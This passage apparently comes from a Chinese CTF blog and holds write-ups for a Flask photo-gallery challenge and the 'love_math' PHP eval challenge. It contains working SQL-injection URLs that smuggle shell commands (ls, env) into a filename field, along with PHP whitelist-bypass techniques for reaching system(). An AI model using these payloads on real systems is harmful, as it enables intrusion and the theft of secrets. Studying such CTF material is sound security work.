class="line">		rep += <span class="string">'&lt;h2&gt;%s&lt;/h2&gt;\n'</span> % sanitize(title)</span><br><span class="line">		rep += <span class="string">'&lt;div&gt;'</span></span><br><span class="line">		cur.execute(<span class="string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span>, (id, ))</span><br><span class="line">		fns = []</span><br><span class="line">		<span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">			rep += <span class="string">'&lt;div&gt;&lt;img src ="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;'</span> % (pid, sanitize(ptitle))</span><br><span class="line">			fns.append(pfn)</span><br><span class="line">		rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch %s || exit 0'</span> % <span class="string">' '</span>.join(<span class="string">'files/'</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'\n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br><span class="line">		rep += <span class="string">'&lt;/div&gt;\n'</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> home.replace(<span class="string">'$ALBUMS$'</span>, rep)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/fetch')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">()</span>:</span></span><br><span class="line">	cur = getDb().cursor()</span><br><span class="line">	<span class="keyword">if</span> cur.execute(<span class="string">'SELECT filename FROM photos WHERE id=%s'</span> % request.args[<span class="string">'id'</span>]) == <span class="number">0</span>:</span><br><span class="line">		abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># It's dangerous to go alone, take this:</span></span><br><span class="line">	<span class="comment"># ^FLAG^273eec860065dd20d11dae90ecc962f862fbd13da66534f8ba8466f926fe95ee$FLAG$</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> file(<span class="string">'./%s'</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">'..'</span>, <span class="string">''</span>), <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> file(<span class="string">'./%s'</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">'..'</span>, <span class="string">''</span>), <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></div>
<p>nice å¾—åˆ°ç¬¬ä¸€ä¸ªflag</p>
<hr>
<h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>å®¡è®¡ <code>main.py</code> ç¬¬53è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch %s || exit 0'</span> % <span class="string">' '</span>.join(<span class="string">'files/'</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œå‰ææ˜¯å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶åˆ—è¡¨fnsä¸­çš„é¡¹fn,ä¾‹å¦‚:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fns&#x3D;[&quot;xx || ls&quot;]</span><br></pre></td></tr></table></figure></div>

<p>åˆ™å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤lsï¼Œå¯ä»¥æ€ä¹ˆæ§åˆ¶fnså‘¢ï¼Œç»§ç»­å¾€å‰çœ‹:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cur.execute(<span class="string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span>, (id, ))</span><br><span class="line">fns = []</span><br><span class="line"><span class="keyword">for</span> pid, ptitle, pfn <span class="keyword">in</span> cur.fetchall():</span><br><span class="line">    rep += <span class="string">'&lt;div&gt;&lt;img src ="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;'</span> % (pid, sanitize(ptitle))</span><br><span class="line">    fns.append(pfn)</span><br></pre></td></tr></table></figure></div>

<p>å¾—çŸ¥åˆ—è¡¨ <code>fns</code> çš„é¡¹æ¥è‡ªè¡¨ <code>photos</code> ä¸­ <code>filename</code>ï¼Œå¦‚æœèƒ½å¤Ÿæ§åˆ¶è¡¨ <code>photos</code> ä¸­çš„ <code>filename</code> å°±èƒ½æœ€ç»ˆè¿›è¡Œä»£ç æ³¨å…¥ï¼Œçœ‹59è¡Œå¼€å§‹çš„ä»£ç :</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch</span><span class="params">()</span>:</span></span><br><span class="line">    cur = getDb().cursor()</span><br><span class="line">    <span class="keyword">if</span> cur.execute(<span class="string">'SELECT filename FROM photos WHERE id=%s'</span> % request.args[<span class="string">'id'</span>]) == <span class="number">0</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    <span class="comment"># It's dangerous to go alone, take this:</span></span><br><span class="line">    <span class="comment"># ^FLAG^276c9cab4db9a0f361be2059933e1238ddac12c6b3c3ce867e736068284e9036$FLAG$</span></span><br><span class="line">    <span class="keyword">return</span> file(<span class="string">'./%s'</span> % cur.fetchone()[<span class="number">0</span>].replace(<span class="string">'..'</span>, <span class="string">''</span>), <span class="string">'rb'</span>).read()</span><br></pre></td></tr></table></figure></div>

<p>è¿™è¾¹CSDNå¤§ä½¬ç»™å‡ºçš„ä¾‹å­</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ–¹å¼ä¸€ï¼š</span><br><span class="line"></span><br><span class="line">userid &#x3D; â€œ123â€</span><br><span class="line">sql &#x3D; â€œselect id,name from user where id &#x3D; â€˜%sâ€™â€ % userid</span><br><span class="line">cur.execute(sql)</span><br><span class="line"></span><br><span class="line">æ–¹å¼äºŒï¼š</span><br><span class="line"></span><br><span class="line">sqlè¯­å¥æ¨¡æ¿ä¸­çš„å‚æ•°å¡«å……ç¬¦æ˜¯ %s è€Œä¸æ˜¯ â€˜%sâ€™ ,ä¸”å¤šä¸ªå‚æ•°éœ€è¦ç”¨å…ƒç¥–</span><br><span class="line">å­˜æ”¾ï¼Œå•ä¸ªå‚</span><br><span class="line">æ•°å¯ç›´æ¥ä¼ é€’</span><br><span class="line"></span><br><span class="line">userid &#x3D; â€œ123â€</span><br><span class="line">sql &#x3D; &quot;â€œselect id,name from user where id &#x3D; %s and name &#x3D;%sâ€</span><br><span class="line">cur.execute(sql, (â€˜123â€™, â€˜äº‘å¤©æ˜â€™))</span><br><span class="line"></span><br><span class="line">åŒºåˆ«ï¼š</span><br><span class="line">æ–¹å¼ä¸€ä¼šå­˜åœ¨sqlæ³¨å…¥çš„é£é™©ï¼Œæ–¹å¼äºŒä¸­ç”¨pythonå†…ç½®çš„æ–¹æ³•å¯ä»¥å¯¹sqlè¯­å¥ä¸­ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ ¡éªŒï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå±è”½æ‰sqlæ³¨å…¥ï¼Œå¢åŠ äº†sqlçš„å®‰å…¨æ€§ï¼Œåœ¨ä¸ä¾¿ç›´æ¥ä½¿ç”¨sqlArchemyæ¡†æ¶ï¼ˆåº•å±‚å®ç°ä¹Ÿæ˜¯è°ƒç”¨çš„æ–¹å¼äºŒï¼‰çš„æƒ…å†µä¸‹ï¼Œå»ºè®®é€‰æ‹©æ–¹å¼äºŒã€‚</span><br></pre></td></tr></table></figure></div>


<p>è¿™é‡Œ <code>cur.execute</code> å°±æ˜¯sqlæ³¨å…¥ç‚¹å‘ç”Ÿçš„ä½ç½®ï¼Œé€šè¿‡æ§åˆ¶ <code>request.args[&#39;id&#39;]</code> è¾¾åˆ°æ§åˆ¶sqlè¿‡ç¨‹ï¼Œé‚£ä¹ˆå¦‚æœ<code>executeå‡½æ•°</code> æ”¯æŒ <code>sqlå †å æŸ¥è¯¢</code>ï¼Œæˆ‘ä»¬ä¸å°±å¯ä»¥æ§åˆ¶è¡¨ <code>photos</code> ä¸­çš„æ•°æ®äº†ä¹ˆï¼Œæˆ‘ä»¬å…ˆæ¥æµ‹è¯•ä¸€ä¸‹å§,è®¿é—®URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;1;update photos set title&#x3D;&#39;test&#39; where id&#x3D;1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è®©åå°æ‰§è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cur.execute(<span class="string">'SELECT filename FROM photos WHERE id=1;update photos set title='</span>test<span class="string">' where id=1;commit;--'</span>)</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè®¿é—®ä¸»é¡µï¼š</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8wfnlj30ot0lkjz5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8wfnlj30ot0lkjz5.jpg" class="lazyload" title="test"></a></p>
<p>å¯ä»¥çœ‹åˆ° <code>title</code> è¢«æˆåŠŸçš„æ”¹äº†è¿‡æ¥ï¼Œè¯´æ˜ <code>executeå‡½æ•°</code> æ˜¯æ”¯æŒå †å æŸ¥è¯¢çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ payloadçš„ï¼Œå‡å¦‚æˆ‘è¦æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤æ˜¯lsï¼š<br>é‚£ä¹ˆ53è¡Œå°±åº”è¯¥æ˜¯ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch files/xx ||ls || exit 0'</span>, shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆ <code>fns=[&quot;xx ||ls&quot;]</code><br>å°±æ˜¯ <code>filename=&quot;xx ||ls&quot;</code><br>æ‰€ä»¥æˆ‘ä»¬åªè¦æ‰§è¡Œ<code>update photos set filename=&#39;xx ||ls&#39; where id=1</code>ï¼Œå¹¶ä¸”åˆ é™¤å¦å¤–è¡¨<code>photos</code> ä¸­å¦å¤–ä¸¤è¡Œ <code>delete from photos where id&lt;&gt;1</code>ï¼Œå°±èƒ½ä¿è¯æœ€ç»ˆ<code>filename=&quot;xx ||ls&quot;</code>ï¼Œæˆ‘ä»¬æ¥å®è·µä¸€ä¸‹ï¼šä¾æ¬¡è®¿é—®URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;1;update photos set filename&#x3D;&#39;xx ||ls&#39; where id&#x3D;1;commit;--</span><br><span class="line">fetch?id&#x3D;1;delete from photos where id&lt;&gt;1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè®¿é—®ä¸»é¡µ:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8inggj30mk0gj0t1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8inggj30mk0gj0t1.jpg" class="lazyload" title="test"></a></p>
<p>ä¸ºä»€ä¹ˆåªæœ‰ä¸€é¡¹ï¼ŒåŸå› åœ¨ç¬¬53è¡Œ:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rep += <span class="string">'&lt;i&gt;Space used: '</span> + subprocess.check_output(<span class="string">'du -ch %s || exit 0'</span> % <span class="string">' '</span>.join(<span class="string">'files/'</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">'n'</span>, <span class="number">1</span>)[<span class="number">-1</span>] + <span class="string">'&lt;/i&gt;'</span></span><br></pre></td></tr></table></figure></div>

<p>ç»“å°¾å¤„çš„ <code>(...).strip().rsplit(&#39;n&#39;,1)[-1]</code> ä½¿å¾—ç»“æœåªè¾“å‡ºä¸€è¡Œï¼Œæ€ä¹ˆæ‰èƒ½è®©ç»“æœå…¨éƒ¨è¾“å‡ºå‘¢ï¼ŒåŠæ³•æœ‰å¤šç§ï¼Œå¯ä»¥ç”¨ <code>... | tr -t &#39;n&#39; &#39;:&#39;</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8lnzzj30i708n3yl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8lnzzj30i708n3yl.jpg" class="lazyload" title="test"></a></p>
<p>å…ˆè®¿é—®URL:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;1;update photos set filename&#x3D;&quot;xx ||ls|tr -t &#39;n&#39; &#39;:&#39;&quot; where id&#x3D;1;commit;--</span><br></pre></td></tr></table></figure></div>

<p>åœ¨è®¿é—®ä¸»é¡µ<br>æœ€åå‘ç°flagå±…ç„¶åœ¨envç¯å¢ƒå˜é‡é‡Œï¼Œ<br>è®¿é—®url:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch?id&#x3D;1;update photos set filename&quot;xx ||env|tr -t &#39;n&#39; &#39;:&#39;&quot; where id&#x3D;1;commit;--</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8va1kj31gt0jcdsf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g4r9m8va1kj31gt0jcdsf.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå¾—åˆ°äº†å…¨éƒ¨çš„flag<br>emmmmm</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>iæ˜¥ç§‹å›½èµ› love_math</title>
    <url>/yakko117/2019/05/16/love_math/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love_Math"></a>Love_Math</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1 </span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs); </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°é¢˜ç›®é™åˆ¶äº†å‚æ•°é•¿åº¦è¦æ±‚å°äº80<br>å¹¶ä¸”ä¸èƒ½åŒ…å«<code>ç©ºæ ¼</code>ã€<code>åˆ¶è¡¨ç¬¦</code>ã€<code>æ¢è¡Œ</code>ã€<code>å•åŒå¼•å·</code>ã€<code>åå¼•å·</code>ã€<code>[]</code> ã€‚<br>å¹¶ä¸”æœ‰ç™½åå•é™åˆ¶è¾“å…¥çš„å­—ç¬¦ï¼›<br>æœ€ç»ˆæ‰§è¡Œ <code>eval(&#39;echo &#39;.$content.&#39;;&#39;);</code></p>
<p>æƒ³è¦ <code>getshell</code>ï¼Œéœ€è¦èƒ½è·å¾—ä»»æ„å­—ç¬¦ä¸²ã€‚ä½†ç”±äºå•åŒå¼•å·éƒ½è¢«wafäº†ï¼Œæˆ‘ä»¬æ— æ³•ä»å‡½æ•°åä¸­æå–å­—ç¬¦ä¸²ã€‚å› æ­¤åªèƒ½æƒ³åŠæ³•ä»å‡½æ•°çš„è¿”å›ç»“æœä¸­è·å¾—ã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹æ–‡æ¡£ï¼Œ å‘ç° <code>base_convent</code> å‡½æ•°å¯ä»¥è¿”å›ä»»æ„å­—æ¯ï¼Œ ä½†æ˜¯æ— æ³•è¿”å› <code>_ *</code> ç­‰ç‰¹æ®Šå­—ç¬¦</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj52nvj30pf0dydio.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj52nvj30pf0dydio.jpg" class="lazyload" title="test"></a></p>
<p>å°è¯•å°† <code>phpinfo</code> å…ˆè½¬æ¢æˆ <code>hex</code> å½¢å¼å†è½¬æ¢æˆåè¿›åˆ¶ï¼ŒæŸ¥çœ‹ç»“æœ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj4494j30lo0d9jsi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj4494j30lo0d9jsi.jpg" class="lazyload" title="test"></a></p>
<p>æˆåŠŸæ‰§è¡Œ <code>phpinfo()</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj44lqj30uz0dmt9w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj44lqj30uz0dmt9w.jpg" class="lazyload" title="test"></a></p>
<p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ <code>system&#39;ls&#39;</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj3suuj30s406zglx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj3suuj30s406zglx.jpg" class="lazyload" title="test"></a></p>
<p>ç°åœ¨æˆ‘ä»¬è¦æƒ³åŠæ³•å¾—åˆ°<code>flag.php</code> ï¼Œæœ‰ä»¥ä¸‹æ–¹æ³•:</p>
<ol>
<li>ä½¿ç”¨phpå‡½æ•° <code>readfile</code> è¯»å–æ–‡ä»¶ï¼Œ ä½†æ˜¯éœ€è¦ <code>flag.php</code> ä¸­çš„ <code>Â·</code>ï¼›</li>
<li>ç”±äºé•¿åº¦é—®é¢˜ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å‚æ•°cé‡Œä¼ è¿‡å¤šçš„ç™½åå•å‡½æ•°+å­—ç¬¦ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ $_GET å…¨å±€å˜é‡æ‰‹åŠ¨ä¼ å…¥å‚æ•° getshellï¼Œä¸ç›´æ¥ä½¿ç”¨å‚æ•°cï¼Œå³å¯ç»•è¿‡ï¼Œä½†è¦æ³¨æ„çš„æ˜¯æ­¤å¤„çš„å‚æ•°åï¼Œä¸èƒ½ä¸ºå­—æ¯ï¼Œåªèƒ½ä¸ºæ•°å­—ï¼Œä¸ç„¶ä¼šè¢«ç¬¬äºŒä¸ªå…³é”®è¯ç™½åå•æ‰€æ‹¦æˆªï¼›</li>
<li>ä½¿ç”¨system ç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°é…åˆé€šé…ç¬¦ <code>*</code> è¯»å–æ–‡ä»¶.</li>
</ol>
<hr>
<h2 id="è§£æ³•1"><a href="#è§£æ³•1" class="headerlink" title="è§£æ³•1"></a>è§£æ³•1</h2><p>ä¸ºäº†ç¼©çŸ­å­—ç¬¦é•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‡½æ•° <code>base_convert</code> èµ‹å€¼ç»™ä¸€ä¸ªçŸ­å˜é‡å,ç”±äºç™½åå•çš„é™åˆ¶ï¼Œæˆ‘ä»¬æœ€å°‘éœ€è¦ä¸¤ä¸ªå­—ç¬¦ï¼Œå³ <code>$pi</code> ã€‚</p>
<p>(è¿™é‡Œç›´æ¥å¥—ç”¨å¤§ä½¬çš„ä¸€ä¸ªè„šæœ¬)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ss=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'['</span>,<span class="string">'Q'</span>,<span class="string">'P'</span>,<span class="string">'S'</span>,<span class="string">'U'</span>,<span class="string">'R'</span>,<span class="string">'W'</span>,<span class="string">'T'</span>,<span class="string">'V'</span>,<span class="string">'Y'</span>,<span class="string">'X'</span>,<span class="string">'Z'</span>,<span class="string">'\','</span>_<span class="string">','</span>^<span class="string">','</span>]<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach ($ss as $w) &#123;</span></span><br><span class="line"><span class="string">    foreach ($ss as $r)&#123;</span></span><br><span class="line"><span class="string">        echo $w;</span></span><br><span class="line"><span class="string">        echo(" and ");</span></span><br><span class="line"><span class="string">        echo $r;</span></span><br><span class="line"><span class="string">        echo(" &lt;=&gt; ");</span></span><br><span class="line"><span class="string">        echo ($w^$r);</span></span><br><span class="line"><span class="string">        echo(" &lt;=&gt; ");</span></span><br><span class="line"><span class="string">        echo(ord($w^$r));</span></span><br><span class="line"><span class="string">        echo ("&lt;br&gt;");</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å‘ç°æ— æ³•å¼‚æˆ–å‡º <code>.</code> ï¼Œä½†æ˜¯å¯ä»¥dechexå‡½æ•°å¯ä»¥æŠŠ10è¿›åˆ¶è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å†å¼‚æˆ–å‡ºhex2binï¼Œæ¥è·å–ä»»æ„ASCIIå­—ç¬¦ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj7rwgj30i20g3my1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj7rwgj30i20g3my1.jpg" class="lazyload" title="test"></a></p>
